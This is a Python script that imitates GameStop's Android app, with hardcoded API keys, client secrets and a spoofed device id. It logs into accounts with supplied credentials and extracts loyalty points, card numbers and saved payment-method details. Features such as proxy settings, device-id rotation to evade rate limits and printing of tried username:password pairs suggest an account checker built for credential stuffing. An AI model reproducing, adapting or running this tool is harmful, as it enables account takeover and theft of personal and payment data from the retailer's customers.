import requests
import json
import time
import base64
import io
from sys import argv
from colorama import init
from termcolor import colored
from multiprocessing import Queue
from tkinter.filedialog import askopenfilename
def stringToBase64(s):
    return base64.b64encode(s.encode('utf-8'))


deviceid = "6c52718dad82d13a8a2e8d11fbfc77d4"

print (("Your device id is : %s")%(str(deviceid)))
x = input("you want to change device id y/n? ")
if(str(x) == 'y'):
    deviceidx = input("Enter new device id ")
    deviceid = deviceidx


def cc(p):
    uc = 'https://api.gamestop.com/mobileapi/v1/paymentmethods/me'
    hc = {
                   'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7106 Build/JLS36C)',
                   'x-developer-key': '6c52718dad82d13a8a2e8d11fbfc77d4',
                   'x-app-version': '609',
                   'Accept': 'application/json; charset=utf-8',
                   'x-device': deviceid,
                   'Accept-Charset': 'utf-8',
                   "Authorization":"Bearer %s"%(p)
               }
    rc = requests.get(uc,headers=hc)
    tc = json.loads(rc.text)
    return (str(tc))

def auth(username,password):
        time.sleep(1)
        string = ('%s:%s')%(str(username),str(password))
        encoded = stringToBase64(string)        
        stringx = encoded.decode("utf-8") 
        base64x = str(stringx)
        data = {
                'grant_type':'password',
                'username':username,
                'password':password,
                'client_id':'Mjk1NTdkNTVhMzY2NjA1MTphbmRyb2lkOjYwOQ==',
                'client_secret':'M2ZhZjgwNzExYWZiMmU5ZGExZDQ4NDExODQ2ZjIxNmQ2Yjc3NTIzYw=='
        }
        
        url = 'https://api.gamestop.com/mobileapi/v1/authorization/token'
        headerzs = {
           'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7106 Build/JLS36C)',
           'x-developer-key': '6c52718dad82d13a8a2e8d11fbfc77d4',
           'x-app-version': '609',
           'Accept': 'application/json; charset=utf-8',
           'x-device': deviceid
           }
        prox = {'https': 'https://212.126.107.182:65103'}
        response = requests.post(url,data=data,headers=headerzs)
        last = response.text
        if(str(response.status_code) == '200'):
            lastx = json.loads(last)
            if(str(last) == '"User Name or Password are incorrect"' or str(last)=='"Message":"Authorization has been denied for this request."'):
                print(last)
            if('access_token' in lastx) :
                token = lastx['access_token']
                headerxs = {
                   'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G7106 Build/JLS36C)',
                   'x-developer-key': '6c52718dad82d13a8a2e8d11fbfc77d4',
                   'x-app-version': '609',
                   'Accept': 'application/json; charset=utf-8',
                   'x-device': deviceid,
                   'Accept-Charset': 'utf-8',
                   "Authorization":"Bearer %s"%(token)
               }
                u = 'https://api.gamestop.com/mobileapi/v1/profiles/me'
                r = requests.get(u,headers=headerxs)
                z = r.text
                zx = json.loads(z)
                x = zx['PURInfo']
                if (x== None):
                    return ('0')
                else: 
                    points = zx['PURInfo']['Available']
                    apoints = zx['PURInfo']['Lifetime']
                    card = zx['PURInfo']['CardNumber']
                    ccx = cc(token)
                    return (':%s lifetimepoints :%s card : %s , cardtype : %s') % (points,apoints,card,ccx)
        if(str(response.status_code) == '204'):
            print ("change device or wait a lil bit")
            return ('204')
        if(str(response.status_code)== '401'):
            print (('%s:%s')%(username,password))
            print (last)
            return ('401')



user = input("Enter Email/Username :? ")
pasx = input("Enter Password : ? ")

total = auth(user,pasx)

print (str(total))
